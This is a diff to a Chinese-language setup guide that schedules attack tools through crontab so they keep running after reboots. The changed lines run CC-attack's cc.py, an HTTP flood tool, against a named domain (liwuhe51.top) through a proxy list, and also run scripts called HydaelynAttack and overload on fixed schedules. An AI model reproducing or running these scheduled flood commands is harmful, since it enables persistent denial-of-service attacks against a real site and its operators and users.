@@ -82,9 +82,9 @@ crontab -e
 
 ## 插入的计划任务
 ```shell
-0 * * * * python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/proxy.txt -v 5 -s 30
-15 * * * * python3 ~/HydaelynAttack/HydaelynAttack_p_once.py
-30 * * * * python3 ~/overload/overload_p.py
+2 */12 * * * python3 ~/CC-attack/cc.py -url http://liwuhe51.top -f ~/proxy.txt -v 5 -s 30
+5 */4 * * * python3 ~/HydaelynAttack/HydaelynAttack_p_once.py
+0 * * * * python3 ~/overload/overload_p.py
 ```
 - 编辑完成后按esc退出编辑
 - 英文输入 :qw 保存退出，之后即使重启系统，依然会定时执行
